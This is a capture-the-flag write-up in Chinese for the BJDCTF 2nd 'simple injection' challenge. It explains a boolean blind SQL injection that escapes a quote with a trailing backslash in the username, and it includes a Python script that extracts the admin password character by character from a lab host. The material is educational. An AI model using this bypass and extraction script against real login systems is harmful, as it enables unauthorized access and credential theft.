# \[BJDCTF 2nd]简单注入

## \[BJDCTF 2nd]简单注入

## 考点

* 布尔盲注

## wp

在 hint.txt 发现提示

在 hint.txt 发现提示

```
Only u input the correct password then u can get the flag
and p3rh4ps wants a girl friend.

select * from users where username='$_POST["username"]' and password='$_POST["password"]';

//出题人四级压线才过 见谅见谅 领会精神
```

首先，burp爆破一下，看一下过滤了什么，union like select and -- = & select " ' 这些都被过滤\
根据给出的语句，如果输入 admin\ 则拼接之后如下

```
select * from users where username='admin\' and password=' or 1 # ';
```

后台执行SQL语句时将第二个单引号转义，那么第一个单引号闭合的就是第三个单引号，最后一个单引号使用#注释，再配合or语句，就可以进行注入。接下来是注入回显的判断，password输入 or 1 # ，返回 BJD needs to be stronger 输入 or 0 # 返回 You konw ,P3rh4ps needs a girl friend

这里就可以进行布尔盲注，最简单的爆破脚本如下

```python
import requests

url = 'http://305e9315-9616-4f0c-a957-36ea479221ed.node3.buuoj.cn/index.php'

flag = ''

for x in range(1,30):
    for i in range(32, 127):
    
        payload = f"or ascii(substr(password,{x},1))>{i} #"
        #print(payload)
        data = {
            "username": "admin\\",
            "password": payload
        }
        r = requests.post(url, data)
        if "BJD needs to be stronger" not in r.text:
            flag = flag + chr(i)
            break
    print(flag)
```

假设第一个字符为 a，a 的 ASCII 为 97，97大于32，所以payload返回BJD needs to be stronger，当 i 增加到 97 时，97大于97是假的，所以payload返回 You konw ,P3rh4ps needs a girl friend，此时第一个字符就是chr(97)
